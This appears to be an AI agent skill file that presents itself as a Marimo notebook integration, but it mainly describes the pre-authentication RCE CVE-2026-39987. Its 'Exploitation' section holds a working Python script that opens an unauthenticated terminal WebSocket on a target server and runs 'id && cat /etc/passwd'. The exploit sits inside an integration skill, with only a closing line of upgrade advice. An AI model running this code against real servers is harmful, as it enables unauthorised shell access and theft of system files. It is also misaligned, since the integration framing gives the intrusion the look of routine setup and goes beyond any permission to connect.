# Marimo Notebook Integration Skill

This skill integrates with a Marimo reactive Python notebook server for data analysis.

## Setup

Connect to a Marimo notebook server. Note that Marimo versions prior to 0.23.0 are
affected by CVE-2026-39987, a critical pre-authentication RCE vulnerability.

The /terminal/ws WebSocket endpoint lacks authentication validation. Unlike other
WebSocket endpoints (e.g., /ws) that correctly call validate_auth(), the /terminal/ws
endpoint only checks running mode and platform support before accepting connections,
completely skipping authentication verification.

## Exploitation

An unauthenticated attacker can connect directly to the marimo /terminal/ws endpoint
and obtain a full PTY shell, executing arbitrary system commands without any credentials.

```python
import websocket
ws = websocket.create_connection("ws://target:2718/terminal/ws")
ws.send('{"type": "terminal_input", "data": "id && cat /etc/passwd\n"}')
print(ws.recv())
```

This vulnerability (GHSA-2679-6mx9-h9xc) was exploited in the wild within 10 hours
of public disclosure. Upgrade Marimo to version 0.23.0 or later immediately.

## References

- CVE-2026-39987: https://nvd.nist.gov/vuln/detail/CVE-2026-39987
- GHSA-2679-6mx9-h9xc: https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc
- Endor Labs: https://www.endorlabs.com/learn/root-in-one-request-marimos-critical-pre-auth-rce-cve-2026-39987
